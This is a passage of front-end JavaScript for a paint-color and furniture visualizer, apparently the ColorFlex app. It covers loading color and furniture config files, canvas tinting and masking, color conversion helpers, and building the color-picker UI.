    
    // Check current state
    const currentCollection = appState.selectedCollection?.name;
    if (!currentCollection) {
        console.log(`❌ No collection currently selected`);
        return;
    }
    console.log(`✅ Current collection: ${currentCollection}`);
    
    // Check compatibility
    const compatible = getCompatibleFurniture(currentCollection);
    console.log(`✅ Compatible furniture: ${compatible.length} pieces`);
    compatible.forEach(f => console.log(`   - ${f.name}`));
    
    // Check if Try Furniture button should be visible
    const tryButton = document.getElementById('tryFurnitureBtn');
    const backButton = document.getElementById('backToPatternsBtn');
    
    if (appState.furnitureMode) {
        console.log(`🪑 Currently in FURNITURE MODE`);
        console.log(`   Back button present: ${!!backButton}`);
    } else {
        console.log(`🎨 Currently in PATTERN MODE`);
        console.log(`   Try Furniture button present: ${!!tryButton}`);
        if (!tryButton && compatible.length > 0) {
            console.log(`⚠️  Try Furniture button should be visible but isn't!`);
        }
    }
    
    return {
        furnitureConfigLoaded: !!furnitureConfig,
        collectionsLoaded: appState.collections?.length > 0,
        currentCollection: currentCollection,
        compatibleFurniture: compatible.length,
        furnitureMode: appState.furnitureMode,
        tryButtonPresent: !!tryButton,
        backButtonPresent: !!backButton
    };
}

// 3. Easy console commands
window.checkStatus = checkFurnitureImplementationStatus;

// 4. Example usage guide
// Workflow helpers available in development mode only
if (window.location.hostname === 'localhost' || window.location.hostname.includes('dev')) {
    console.log(`
🪑 FURNITURE WORKFLOW HELPERS LOADED!
=====================================

Console Commands:
• workflowHelpers.showPlan() - See complete rendering plan
• workflowHelpers.showFolders('sofa-capitol', 'botanicals') - See folder structure
• workflowHelpers.showFiles('botanicals', 'Key Largo', 'sofa-capitol') - See expected files
• workflowHelpers.testSlug('Pattern Name Here') - Test slug conversion
• workflowHelpers.showCompatibility() - See what's compatible with what
• workflowHelpers.generateFolderScript('sofa-capitol') - Generate mkdir commands
• checkStatus() - Check implementation status

Example Workflow:
1. workflowHelpers.showPlan() - See total work needed
2. workflowHelpers.generateFolderScript('sofa-capitol') - Create folders
3. Render patterns and save to generated folders
4. Test with Try Furniture button!
`);
}

// 5. Integration check
document.addEventListener('DOMContentLoaded', () => {
    // Wait a bit for everything to load
    setTimeout(() => {
        console.log(`🔍 Running furniture integration check...`);
        checkFurnitureImplementationStatus();
    }, 2000);
});

// Load furniture config on app init
let furnitureConfig = null;

async function loadFurnitureConfig() {
    try {
        console.log(""📁 Loading furniture config..."");
        let response;
        const furnitureConfigUrl = window.ColorFlexAssets?.furnitureConfigUrl || '/assets/furniture-config.json';
        response = await fetch(furnitureConfigUrl, {
            method: 'GET',
            cache: 'no-cache',
            headers: {
                'Content-Type': 'application/json',
            }
        });
        
        if (response.ok) {
            furnitureConfig = await response.json();
            console.log('✅ Loaded furniture config:', furnitureConfig);
            
            // Debug the structure
            Object.keys(furnitureConfig).forEach(key => {
                console.log(`  ${key}:`, Object.keys(furnitureConfig[key]));
            });
        } else {
            if (response.status === 0 || response.status === 403) {
                throw new Error('CORS Error: Cross-origin request blocked');
            }
            console.error(""❌ Furniture config response not ok:"", response.status);
        }
    } catch (e) {
        if (e.name === 'TypeError' && e.message.includes('fetch')) {
            console.error('❌ Network/CORS Error loading furniture config:', e);
        } else {
            console.error(""❌ Error loading furniture config:"", e);
        }
    }
}


dom._patternName = document.getElementById(""patternName""); // Initial assignment

// Fetch colors from colors.json
async function loadColors() {
    try {
        // Check if colors are embedded (Shopify mode)
        if (window.ColorFlexData && window.ColorFlexData.colors) {
            console.log(""🎯 Using embedded Sherwin-Williams colors"");
            appState.colorsData = window.ColorFlexData.colors;
            console.log(""✅ Colors loaded:"", appState.colorsData.length);
            return;
        }
        
        // Load directly from Shopify assets
        console.log(""📁 Loading colors from Shopify assets"");
        const colorsUrl = window.ColorFlexAssets?.colorsUrl || ""/assets/colors.json"";
        const response = await fetch(colorsUrl, {
            method: 'GET',
            cache: 'no-cache',
            headers: {
                'Content-Type': 'application/json',
            }
        });
        if (!response.ok) {
            if (response.status === 0 || response.status === 403) {
                throw new Error('CORS Error: Cross-origin request blocked');
            }
            throw new Error(`HTTP error: ${response.status}`);
        }
        
        const data = await response.json();
        if (!Array.isArray(data) || data.length === 0) {
            throw new Error(""Colors data is empty or invalid"");
        }

        appState.colorsData = data;
        console.log(""✅ Colors loaded:"", appState.colorsData.length);
    } catch (err) {
        console.error(""âŒ Error loading colors:"", err);
        alert(""Failed to load Sherwin-Williams colors."");
    }
}

// Lookup color from colors.json data
let lookupColor = (colorName) => {
    if (!colorName || typeof colorName !== ""string"") {
        console.warn(`Invalid colorName: ${colorName}, defaulting to #FFFFFF`);
        return ""#FFFFFF"";
    }
    const cleanedColorName = colorName.replace(/^(SW|SC)\d+\s*/i, """").toLowerCase().trim();
    console.log(`lookupColor: cleanedColorName=${cleanedColorName}`);
    if (/^#[0-9A-F]{6}$/i.test(cleanedColorName)) {
        console.log(`lookupColor: ${colorName} is a hex value, returning ${cleanedColorName}`);
        return cleanedColorName;
    }
    const colorEntry = appState.colorsData.find(c => c.color_name.toLowerCase() === cleanedColorName);
    if (!colorEntry) {
        console.warn(`Color '${cleanedColorName}' not found in colorsData, defaulting to #FFFFFF`);
        return ""#FFFFFF"";
    }
    console.log(`Looked up ${colorName} -> #${colorEntry.hex}`);
    return `#${colorEntry.hex}`;
};
if (USE_GUARD && DEBUG_TRACE) {
    lookupColor = guard(traceWrapper(lookupColor, ""lookupColor"")); // Wrapped for debugging
} else if (USE_GUARD) {
    lookupColor = guard(lookupColor, ""lookupColor""); // Wrapped for debugging
}

// Hamburger menu functionality
document.addEventListener('DOMContentLoaded', function() {
    const hamburgerBtn = document.getElementById('hamburgerBtn');
    const sidebar = document.getElementById('leftSidebar');
    
    if (hamburgerBtn && sidebar) {
        hamburgerBtn.addEventListener('click', function() {
            hamburgerBtn.classList.toggle('active');
            sidebar.classList.toggle('open');
        });
        
        // Close sidebar when clicking outside on mobile
        document.addEventListener('click', function(e) {
            if (window.innerWidth <= 1023 && 
                !sidebar.contains(e.target) && 
                !hamburgerBtn.contains(e.target) && 
                sidebar.classList.contains('open')) {
                hamburgerBtn.classList.remove('active');
                sidebar.classList.remove('open');
            }
        });
    }
});

// Check if a specific pattern has furniture renders
async function checkFurnitureAvailability(patternName) {
  const patternSlug = patternName.toLowerCase().replace(/ /g, '-');
  const manifestUrl = `data/furniture/sofa-capitol/patterns/${patternSlug}/manifest.json`;
  
  try {
    const response = await fetch(manifestUrl, {
      method: 'GET',
      mode: 'cors',
      cache: 'no-cache',
      headers: {
        'Content-Type': 'application/json',
      }
    });
    if (response.ok) {
      const manifest = await response.json();
      return {
        available: true,
        manifest: manifest,
        furnitureType: 'sofa-capitol'
      };
    }
  } catch (e) {
    // No furniture version
  }
  return { available: false };
}

// Call loadFurnitureConfig when your app initializes
loadFurnitureConfig();



// Utility Functions

// Helper function for scaling
function scaleToFit(img, targetWidth, targetHeight) {
    const aspectRatio = img.width / img.height;
    let drawWidth = targetWidth;
    let drawHeight = targetHeight;
    
    if (aspectRatio > targetWidth / targetHeight) {
        drawHeight = drawWidth / aspectRatio;
    } else {
        drawWidth = drawHeight * aspectRatio;
    }
    
    const x = (targetWidth - drawWidth) / 2;
    const y = (targetHeight - drawHeight) / 2;
    
    return { width: drawWidth, height: drawHeight, x, y };
}
// Shared helper for loading and tinting a masked image
async function drawMaskedLayer(imgPath, tintColor, label) {
    // Check if this is a wall panel image
    const isWallPanel = imgPath.includes('wall-panels');
    
    // Get the original, untinted grayscale image for alpha calculation
    const originalUrl = await new Promise(resolve => 
        processImage(imgPath, resolve, null, 2.2, false, false, false)
    );
    const img = await loadImage(originalUrl);

    // Draw the original image centered on an offscreen canvas
    const offscreen = document.createElement(""canvas"");
    offscreen.width = 1080;
    offscreen.height = 1080;
    const offCtx = offscreen.getContext(""2d"");
    drawCenteredImage(offCtx, img, 1080, 1080);

    // Get pixel data
    let imageData;
    try {
        imageData = offCtx.getImageData(0, 0, 1080, 1080);
    } catch (e) {
        console.warn(""⚠️ Canvas tainted, skipping masked layer processing:"", e.message);
        return;
    }
    const { data } = imageData;

    // Invert luminance for alpha: white (255) â†’ alpha 0, black (0) â†’ alpha 255
    for (let i = 0; i < data.length; i += 4) {
        const r = data[i];
        const g = data[i + 1];
        const b = data[i + 2];
        const luminance = 0.299 * r + 0.587 * g + 0.114 * b;
        data[i + 3] = 255 - luminance; // INVERTED for correct alpha
    }
    offCtx.putImageData(imageData, 0, 0);

    // Prepare the colored (tint) layer and mask it with the alpha
    const tintLayer = document.createElement(""canvas"");
    tintLayer.width = 1080;
    tintLayer.height = 1080;
    const tintCtx = tintLayer.getContext(""2d"");
    tintCtx.fillStyle = tintColor;
    tintCtx.fillRect(0, 0, 1080, 1080);
    tintCtx.globalCompositeOperation = ""destination-in"";
    tintCtx.drawImage(offscreen, 0, 0);

    // Composite result onto main canvas
    ctx.globalAlpha = 1.0;
    ctx.globalCompositeOperation = ""source-over"";
    ctx.drawImage(tintLayer, 0, 0);

    console.log(`✅ [${label}] tint-mask drawn.`);
}

function applyNormalizationProcessing(data, rLayer, gLayer, bLayer) {
    // IMPROVED normalization logic for better detail preservation
    let minLuminance = 255, maxLuminance = 0;
    for (let i = 0; i < data.length; i += 4) {
        const luminance = 0.299 * data[i] + 0.587 * data[i + 1] + 0.114 * data[i + 2];
        minLuminance = Math.min(minLuminance, luminance);
        maxLuminance = Math.max(maxLuminance, luminance);
    }
    const range = maxLuminance - minLuminance || 1;
    console.log(""Min Luminance:"", minLuminance, ""Max Luminance:"", maxLuminance);

    for (let i = 0; i < data.length; i += 4) {
        const luminance = 0.299 * data[i] + 0.587 * data[i + 1] + 0.114 * data[i + 2];
        let normalized = (luminance - minLuminance) / range;
        normalized = Math.max(0, Math.min(1, normalized));
        
        let alpha = 1 - normalized;
        
        if (alpha > 0.8) {
            alpha = 1;
        } else if (alpha > 0.5) {
            alpha = 0.8 + (alpha - 0.5) * 0.67;
        } else if (alpha > 0.2) {
            alpha = alpha * 1.6;
        } else {
            alpha = alpha * 0.5;
        }
        alpha = Math.min(1, Math.max(0, alpha));

        if (alpha > 0.05) {
            data[i] = rLayer;
            data[i + 1] = gLayer;
            data[i + 2] = bLayer;
        } else {
            data[i] = 0;
            data[i + 1] = 0;
            data[i + 2] = 0;
        }
        data[i + 3] = Math.round(alpha * 255);
    }
}

function resolveColor(raw) {
    const color = (!raw || typeof raw !== ""string"") ? ""Snowbound"" : raw.trim().toUpperCase();
    const resolved = lookupColor(color);
    if (!resolved) console.warn(`âš ï¸ [resolveColor] Could not resolve color: '${color}', using Snowbound`);
    return resolved || lookupColor(""Snowbound"") || ""#DDDDDD"";
}

function drawCenteredImage(ctx, img, canvasWidth, canvasHeight) {
    const aspect = img.width / img.height;
    let drawWidth = canvasWidth;
    let drawHeight = drawWidth / aspect;

    if (drawHeight > canvasHeight) {
        drawHeight = canvasHeight;
        drawWidth = drawHeight * aspect;
    }

    const offsetX = Math.round((canvasWidth - drawWidth) / 2);
    const offsetY = Math.round((canvasHeight - drawHeight) / 2);
    ctx.drawImage(img, offsetX, offsetY, drawWidth, drawHeight);
}

function hexToHSL(hex) {
    // Remove # if present
    hex = hex.replace(/^#/, '');

    // Convert 3-digit to 6-digit hex
    if (hex.length === 3) {
        hex = hex.split('').map(x => x + x).join('');
    }

    if (hex.length !== 6) {
        console.error(""âŒ Invalid HEX color:"", hex);
        return null;
    }

    const r = parseInt(hex.substr(0, 2), 16) / 255;
    const g = parseInt(hex.substr(2, 2), 16) / 255;
    const b = parseInt(hex.substr(4, 2), 16) / 255;

    const max = Math.max(r, g, b);
    const min = Math.min(r, g, b);
    let h, s, l = (max + min) / 2;

    if (max === min) {
        h = s = 0; // achromatic
    } else {
        const d = max - min;
        s = l > 0.5 ? d / (2 - max - min) : d / (max + min);
        switch (max) {
            case r: h = ((g - b) / d + (g < b ? 6 : 0)); break;
            case g: h = ((b - r) / d + 2); break;
            case b: h = ((r - g) / d + 4); break;
        }
        h *= 60;
    }

    return {
        h: Math.round(h),
        s: Math.round(s * 100),
        l: Math.round(l * 100)
    };
}

function hslToHex(h, s, l) {
    s /= 100;
    l /= 100;

    const k = n => (n + h / 30) % 12;
    const a = s * Math.min(l, 1 - l);
    const f = n =>
        Math.round(255 * (l - a * Math.max(-1, Math.min(k(n) - 3, Math.min(9 - k(n), 1)))));

    return `#${[f(0), f(8), f(4)].map(x => x.toString(16).padStart(2, '0')).join('')}`;
}

function clamp(value, min, max) {
    return Math.min(max, Math.max(min, value));
}

function findClosestSWColor(targetHex) {
    let bestMatch = null;
    let bestDistance = Infinity;

    for (const color of colorsData) {
        const dist = colorDistance(`#${color.hex}`, targetHex);
        if (dist < bestDistance) {
            bestDistance = dist;
            bestMatch = color;
        }
    }

    return bestMatch;
}

function colorDistance(hex1, hex2) {
    const rgb1 = hexToRGB(hex1);
    const rgb2 = hexToRGB(hex2);
    return Math.sqrt(
        Math.pow(rgb1.r - rgb2.r, 2) +
        Math.pow(rgb1.g - rgb2.g, 2) +
        Math.pow(rgb1.b - rgb2.b, 2)
    );
}

function hexToRGB(hex) {
    hex = hex.replace(/^#/, """");
    if (hex.length === 3) hex = hex.split('').map(c => c + c).join('');
    const bigint = parseInt(hex, 16);
    return { r: (bigint >> 16) & 255, g: (bigint >> 8) & 255, b: (bigint & 255) };
}
// Reusable listener setup
const setupPrintListener = () => {
    const tryAttachListener = (attempt = 1, maxAttempts = 10) => {
        const printButton = document.getElementById(""printButton"");
        console.log(`Print listener - Attempt ${attempt} - Looking for printButton: ${printButton ? ""Found"" : ""Not found""}`);

        if (printButton) {
            const newButton = printButton.cloneNode(true);
            printButton.parentNode.replaceChild(newButton, printButton);

            newButton.addEventListener(""click"", async () => {
                console.log(""Print preview triggered"");
                const result = await generatePrintPreview();
                if (!result) {
                    console.error(""Print preview - Failed to generate output"");
                }
            });
            console.log(""Print listener attached"");
        } else if (attempt < maxAttempts) {
            console.warn(`Print button not found, retrying (${attempt}/${maxAttempts})`);
            setTimeout(() => tryAttachListener(attempt + 1, maxAttempts), 500);
        } else {
            console.error(""Print button not found after max attempts"");
        }
    };

    console.log(""Print listener - Initial DOM state:"", document.readyState);
    console.log(""Print listener - Pattern preview wrapper:"", document.getElementById(""patternPreviewWrapper""));

    if (document.readyState === ""complete"" || document.readyState === ""interactive"") {
        tryAttachListener();
    } else {
        document.addEventListener(""DOMContentLoaded"", () => {
            console.log(""Print listener - DOMContentLoaded fired"");
            tryAttachListener();
        });
    }
};


    const toInitialCaps = (str) =>
        str
            .toLowerCase()
            .replace(/\.\w+$/, '') // Remove file extensions like .jpg, .png, etc.
            .replace(/-\d+x\d+$|-variant$/i, '') // Remove suffixes like -24x24, -variant
            .replace(/_/g, ' ') // Replace underscores with spaces
            .split(/[\s-]+/) // Split on spaces and hyphens
            .map((word) => word.charAt(0).toUpperCase() + word.slice(1))
            .join("" "");

        const stripSWNumber = (colorName) => {
        return colorName.replace(/(SW|SC)\d+\s*/, '').trim(); // Removes ""SW"" followed by digits and optional space
    };

const getContrastClass = (hex) => {
    // console.trace(""getContrastClass received:"", hex);

    if (typeof hex !== ""string"" || !hex.startsWith(""#"") || hex.length < 7) {
        console.warn(""⚠️ Invalid hex value in getContrastClass:"", hex);
        return ""text-black""; // or choose a safe default
    }

    const r = parseInt(hex.slice(1, 3), 16);
    const g = parseInt(hex.slice(3, 5), 16);
    const b = parseInt(hex.slice(5, 7), 16);
    const brightness = (r * 299 + g * 587 + b * 114) / 1000;
    return brightness > 128 ? ""text-black"" : ""text-white"";
};


async function drawFurnitureLayer(ctx, imagePath, options = {}) {
    console.log(""🔍 drawFurnitureLayer ENTRY:"");
    console.log(""  imagePath received:"", imagePath);
    console.log(""  Is sofa base?"", imagePath?.includes('sofa-capitol-base'));
    console.log(""  Is ferns pattern?"", imagePath?.includes('ferns'));

    const {
        tintColor = null,
        isMask = false,
        opacity = 1.0,
        blendMode = ""source-over"",
        zoomState = null,
        highRes = false
    } = options;
    
    const width = 600;
    const height = 450;

    // ✅ Scale up for high resolution pattern rendering
    const renderScale = highRes ? 2 : 1;
    const renderWidth = width * renderScale;
    const renderHeight = height * renderScale;

    
    // ✅ Use passed zoom state if provided, otherwise fall back to global
    const activeZoomState = zoomState || {
        scale: furnitureViewSettings.scale,
        offsetX: furnitureViewSettings.offsetX,
        offsetY: furnitureViewSettings.offsetY,
        isZoomed: furnitureViewSettings.isZoomed
    };
    
    const { scale, offsetX, offsetY } = activeZoomState;
    
    console.log(`🔍 drawFurnitureLayer DEBUG for: ${imagePath.split('/').pop()}`);
    console.log(`   📊 ZOOM STATE: scale=${scale}, offset=(${offsetX.toFixed(1)}, ${offsetY.toFixed(1)})`);
    console.log(`   🔒 Using ${zoomState ? 'PASSED' : 'GLOBAL'} zoom state`);
    console.log(`   Canvas size: ${width}x${height}`);
    
    try {
        const img = await loadImage(imagePath);
        if (!img) {
            console.error(""❌ Failed to load image:"", imagePath);
            return;
        }
        
        console.log(`   Original image: ${img.naturalWidth}x${img.naturalHeight}`);
        if (highRes) console.log(`   🔍 High-res rendering: ${renderWidth}x${renderHeight}`);
        
        const scaledWidth = img.naturalWidth * scale;  // Keep original logic
        const scaledHeight = img.naturalHeight * scale; // Keep original logic

        let drawX = (renderWidth / 2) - (scaledWidth / 2) + (offsetX * renderScale);
        let drawY = (renderHeight / 2) - (scaledHeight / 2) + (offsetY * renderScale);
        
        
        console.log(`   Draw position: (${drawX.toFixed(1)}, ${drawY.toFixed(1)})`);
        
        // Create working canvas at render resolution
        const tempCanvas = document.createElement(""canvas"");
        tempCanvas.width = renderWidth;
        tempCanvas.height = renderHeight;
        const tempCtx = tempCanvas.getContext(""2d"");
        
        if (isMask && tintColor) {
            // ✅ CORRECTED WALL MASK LOGIC
            console.log(`   🎭 Processing wall mask with color ${tintColor}`);
            
            // First, draw the mask image to get its alpha values
            const maskCanvas = document.createElement(""canvas"");
            maskCanvas.width = width;
            maskCanvas.height = height;
            const maskCtx = maskCanvas.getContext(""2d"");
            
            // Draw the scaled mask image
            maskCtx.drawImage(img, drawX, drawY, scaledWidth, scaledHeight);
            
            // Get the mask pixel data
            let maskImageData;
            try {
                maskImageData = maskCtx.getImageData(0, 0, width, height);
            } catch (e) {
                console.warn(""⚠️ Canvas tainted, falling back to simple draw for mask processing:"", e.message);
                tempCtx.drawImage(img, drawX, drawY, scaledWidth, scaledHeight);
                ctx.drawImage(tempCanvas, 0, 0);
                return;
            }
            const maskData = maskImageData.data;
            
            // Create output canvas with the tint color
            const outputImageData = tempCtx.createImageData(width, height);
            const outputData = outputImageData.data;

            console.log(""🎨 TINTING DEBUG:"");
            console.log(""  Image being tinted:"", imagePath?.split('/').pop());
            console.log(""  tintColor parameter:"", tintColor);
            console.log(""  Is sofa base:"", imagePath?.includes('sofa-capitol-base'));

            
            // Parse tint color
            const hex = tintColor.replace(""#"", """");
            const r = parseInt(hex.substring(0, 2), 16);
            const g = parseInt(hex.substring(2, 4), 16);
            const b = parseInt(hex.substring(4, 6), 16);
            
            console.log(""  Parsed RGB:"", r, g, b);
            console.log(""  Should be Cottage Linen RGB: 240, 240, 233"");

            console.log(`   🎨 Tint color RGB: (${r}, ${g}, ${b})`);
            
            // Apply mask: white areas in mask = wall color, black areas = transparent
            for (let i = 0; i < maskData.length; i += 4) {
                const maskR = maskData[i];
                const maskG = maskData[i + 1];
                const maskB = maskData[i + 2];
                
                // Calculate mask intensity (how white the pixel is)
                const maskIntensity = (maskR + maskG + maskB) / 3;
                
                if (maskIntensity > 128) {
                    // White area in mask = apply wall color
                    outputData[i] = r;
                    outputData[i + 1] = g;
                    outputData[i + 2] = b;
                    outputData[i + 3] = 128; // Fully opaque
                } else {
                    // Black area in mask = transparent (let room background show through)
                    outputData[i] = 0;
                    outputData[i + 1] = 0;
                    outputData[i + 2] = 0;
                    outputData[i + 3] = 0; // Fully transparent
                }
            }
            
            // Put the processed image data to the temp canvas
            tempCtx.putImageData(outputImageData, 0, 0);
            
            console.log(`   ✅ Wall mask applied: white areas colored, black areas transparent`);
            
            } else if (tintColor) {
            if (imagePath?.includes('sofa-capitol-base') || imagePath?.includes('patterns/botanicals/')) {
                console.log(""🎨 Using LUMINANCE-based logic for:"", imagePath?.split('/').pop());
                
                // Draw the image first
                tempCtx.drawImage(img, drawX, drawY, scaledWidth, scaledHeight);
                
                // Get image data
                let imageData;
                try {
                    imageData = tempCtx.getImageData(0, 0, renderWidth, renderHeight);
                } catch (e) {
                    console.warn(""⚠️ Canvas tainted, falling back to simple tinting for luminance processing:"", e.message);
                    // Fall back to simple tinting
                    tempCtx.fillStyle = tintColor;
                    tempCtx.fillRect(0, 0, renderWidth, renderHeight);
                    tempCtx.globalCompositeOperation = ""destination-in"";
                    tempCtx.drawImage(img, drawX, drawY, scaledWidth, scaledHeight);
                    tempCtx.globalCompositeOperation = ""source-over"";
                    ctx.drawImage(tempCanvas, 0, 0);
                    return;
                }
                const data = imageData.data;
                
                // Parse tint color
                const hex = tintColor.replace(""#"", """");
                const rLayer = parseInt(hex.substring(0, 2), 16);
                const gLayer = parseInt(hex.substring(2, 4), 16);
                const bLayer = parseInt(hex.substring(4, 6), 16);
                
                // ✅ USE LUMINANCE for both sofa base AND patterns
                for (let i = 0; i < data.length; i += 4) {
                    const r = data[i];
                    const g = data[i + 1];
                    const b = data[i + 2];
                    const brightness = (r + g + b) / 3;
                    
                    if (brightness <= 5) {  // Pure black - transparent
                        data[i + 3] = 0;
                    } else {  // Non-black pixels - tint based on brightness
                        const alpha = brightness / 255;
                        
                        data[i] = rLayer;
                        data[i + 1] = gLayer; 
                        data[i + 2] = bLayer;
                        data[i + 3] = Math.round(alpha * 255);
                    }
                }
                
                tempCtx.putImageData(imageData, 0, 0);
                
            } else {
                // Keep original alpha-based logic for other elements (if any)
                tempCtx.fillStyle = tintColor;
                tempCtx.fillRect(0, 0, width, height);
                
                tempCtx.globalCompositeOperation = ""destination-in"";
                tempCtx.drawImage(img, drawX, drawY, scaledWidth, scaledHeight);
                tempCtx.globalCompositeOperation = ""source-over"";
            }
        }

        else {
            // Direct images - draw at calculated position and size
            tempCtx.drawImage(img, drawX, drawY, scaledWidth, scaledHeight);
            console.log(`   ✅ Direct image drawn at (${drawX.toFixed(1)}, ${drawY.toFixed(1)})`);
        }
        
        // Draw to main canvas
        ctx.save();
        ctx.globalAlpha = opacity;
        console.log(""   🎨 Using NORMAL blend for"", imagePath?.split('/').pop());
        ctx.globalCompositeOperation = blendMode; // Normal for everything else

        if (highRes) {
            // Scale down from high-res to normal resolution
            ctx.drawImage(tempCanvas, 0, 0, renderWidth, renderHeight, 0, 0, width, height);
            console.log(`   ✅ High-res layer scaled down and composited`);
        } else {
            ctx.drawImage(tempCanvas, 0, 0);
        }
        ctx.restore();        
        console.log(`   ✅ Layer composited to main canvas`);
        
    } catch (error) {
        console.error(""❌ Error in drawFurnitureLayer:"", error);
    }
}

// Create a color input UI element
const createColorInput = (label, id, initialColor, isBackground = false) => {
    console.log(`Creating ${label} input, ID: ${id}, initialColor: ${initialColor}`);
    
    const container = document.createElement(""div"");
    container.className = ""layer-input-container"";

    const labelEl = document.createElement(""div"");
    labelEl.className = ""layer-label"";
    labelEl.textContent = label || ""Unknown Layer"";

    const colorCircle = document.createElement(""div"");
    colorCircle.className = ""circle-input"";
    colorCircle.id = `${id}Circle`;
    const cleanInitialColor = (initialColor || ""Snowbound"").replace(/^(SW|SC)\d+\s*/i, """").trim();
    const colorValue = lookupColor(cleanInitialColor);
    console.log(`Setting ${label} circle background to: ${colorValue}`);
    colorCircle.style.backgroundColor = colorValue;

    const input = document.createElement(""input"");
    input.type = ""text"";
    input.className = ""layer-input"";
    input.id = id;
    input.placeholder = `Enter ${label ? label.toLowerCase() : 'layer'} color`;
    input.value = toInitialCaps(cleanInitialColor);
    console.log(`Setting ${label} input value to: ${input.value}`);

    container.append(labelEl, colorCircle, input);
   


    const updateColor = () => {
        console.log(`updateColor called for ${label}, input value: ${input.value}`);
        const formatted = toInitialCaps(input.value.trim());
        if (!formatted) {
            input.value = toInitialCaps(cleanInitialColor);
            colorCircle.style.backgroundColor = colorValue;
            console.log(`${label} input restored to initial color: ${colorValue}`);
        } else {
            const hex = lookupColor(formatted) || ""#FFFFFF"";
            if (hex === ""#FFFFFF"" && formatted !== ""Snowbound"") {
                input.value = toInitialCaps(cleanInitialColor);
                colorCircle.style.backgroundColor = colorValue;
                console.log(`${label} input restored to initial color due to invalid color: ${colorValue}`);
            } else {
                input.value = formatted;
                colorCircle.style.backgroundColor = hex;
                console.log(`${label} input updated to: ${hex}`);
            }
        }

        const layerIndex = appState.currentLayers.findIndex(layer => layer.label === label);
        if (layerIndex !== -1) {
            appState.currentLayers[layerIndex].color = input.value;

            console.log(""🎯 COLOR UPDATE DEBUG:"");
            console.log(`  Changed input: ${label} (index ${layerIndex})`);
            console.log(`  New value: ${input.value}`);
            console.log(""  Current layer structure after update:"");
            appState.currentLayers.forEach((layer, i) => {
                console.log(`    ${i}: ${layer.label} = ""${layer.color}""`);
            });


            console.log(`Updated appState.currentLayers[${layerIndex}].color to: ${input.value}`);
        }

        const isFurniturePattern = appState.currentPattern?.isFurniture || false;

        // Check if we're in fabric mode - render both fabric mockup and pattern preview
        if (appState.isInFabricMode) {
            console.log(""🧵 Color changed in fabric mode - calling both renderFabricMockup() and updatePreview()"");
            renderFabricMockup();
            updatePreview(); // Also update the pattern preview on the left
        } else {
            // Regular furniture or pattern mode
            updatePreview();
            updateRoomMockup();
        }
        populateCoordinates();
    };

    // Restore original event listeners
    input.addEventListener(""blur"", updateColor);
    input.addEventListener(""keydown"", (e) => {
        if (e.key === ""Enter"") updateColor();
    });

    // Restore original click handler
    console.log(`Attaching click handler to ${label} color circle, ID: ${colorCircle.id}`);
        colorCircle.addEventListener(""click"", () => {
        // Check if we're in coordinate mode (back button exists) - exit coordinate mode
        const coordinateBackButton = document.getElementById('backToPatternLink');
        
        if (coordinateBackButton) {
            console.log(`🔄 Color circle clicked in coordinate mode - triggering back to pattern then selecting layer`);
            coordinateBackButton.click(); // Trigger the coordinate back button
            // Pass through the click after returning to pattern mode
            setTimeout(() => {
                appState.lastSelectedLayer = {
                    input,
                    circle: colorCircle,
                    label,
                    isBackground
                };
                highlightActiveLayer(colorCircle);
                console.log(`✅ Layer selected after returning from coordinate mode: ${label}`);
            }, 50);
            return;
        }
        
        // In furniture mode, allow normal color changes - do NOT exit furniture mode
        const furnitureBackButton = document.getElementById('backToPatternsBtn');
        if (furnitureBackButton) {
            console.log(`🎨 Color circle clicked in furniture mode - changing color while staying in furniture mode: ${label}`);
            // Continue with normal color selection behavior below
        }
        
        // Normal color circle behavior
        appState.lastSelectedLayer = {
            input,
            circle: colorCircle,
            label,
            isBackground
        };
        highlightActiveLayer(colorCircle);
        console.log(`Clicked ${label} color circle`);
    });


    return {
        container,
        input,
        circle: colorCircle,
        label,
        isBackground
    };

};


// Populate curated colors in header
function populateCuratedColors(colors) {
  console.log(""🎨 populateCuratedColors called with colors:"", colors?.length);
  console.log(""🔍 curatedColorsContainer element:"", dom.curatedColorsContainer);

  if (!dom.curatedColorsContainer) {
    console.error(""❌ curatedColorsContainer not found in DOM"");
    console.log(""🔍 Available DOM elements:"", Object.keys(dom));
    return;
  }

  if (!colors || !colors.length) {
    console.warn(""⚠️ No curated colors provided, colors array:"", colors);
    return;
  }
  
  console.log(""✅ About to populate"", colors.length, ""curated colors"");

  dom.curatedColorsContainer.innerHTML = """";

  // 🎟️ Run The Ticket Button
  const ticketCircle = document.createElement(""div"");
  ticketCircle.id = ""runTheTicketCircle"";
  ticketCircle.className = ""curated-color-circle cursor-pointer border-2"";
  ticketCircle.style.backgroundColor = ""black"";

  const ticketLabel = document.createElement(""span"");
  ticketLabel.className = ""text-xs font-bold text-white text-center whitespace-pre-line font-special-elite"";
  ticketLabel.textContent = appState.activeTicketNumber
    ? `TICKET\n${appState.activeTicketNumber}`
    : ""RUN\nTHE\nTICKET"";

  ticketCircle.appendChild(ticketLabel);
  ticketCircle.addEventListener(""click"", () => {
    const ticketNumber = prompt(""🎟️ Enter the Sherwin-Williams Ticket Number:"");
    if (ticketNumber) runStaticTicket(ticketNumber.trim());
  });
  dom.curatedColorsContainer.appendChild(ticketCircle);

  // 🎨 Add curated color swatches
  colors.forEach(label => {
    if (!Array.isArray(appState.colorsData)) {
  console.error(""❌ appState.colorsData is not available or not an array"");
  return;
}

const found = appState.colorsData.find(c =>

      label.toLowerCase().includes(c.sw_number?.toLowerCase()) ||
      label.toLowerCase().includes(c.color_name?.toLowerCase())
    );

    if (!found || !found.hex) {
      console.warn(""⚠️ Missing hex for curated color:"", label);
      return;
    }

    const hex = `#${found.hex}`;
    const circle = document.createElement(""div"");
    circle.className = ""curated-color-circle cursor-pointer"";
    circle.style.backgroundColor = hex;

    const text = document.createElement(""span"");
    text.className = `text-xs font-bold text-center ${getContrastClass(hex)} whitespace-pre-line`;
    text.textContent = `${found.sw_number?.toUpperCase()}\n${toInitialCaps(found.color_name)}`;

    circle.appendChild(text);
    circle.addEventListener(""click"", () => {
      const selectedLayer = appState.lastSelectedLayer;
      if (!selectedLayer) return alert(""Please select a layer first."");

      selectedLayer.input.value = toInitialCaps(found.color_name);
      selectedLayer.circle.style.backgroundColor = hex;

      const i = appState.currentLayers.findIndex(l => l.label === selectedLayer.label);
      if (i !== -1) appState.currentLayers[i].color = found.color_name;

      const j = appState.layerInputs.findIndex(li => li.label === selectedLayer.label);
      if (j !== -1) {
        appState.layerInputs[j].input.value = toInitialCaps(found.color_name);
        appState.layerInputs[j].circle.style.backgroundColor = hex;
      }

      appState.lastSelectedColor = { name: found.color_name, hex };
      updateDisplays();
    });

    dom.curatedColorsContainer.appendChild(circle);
  });

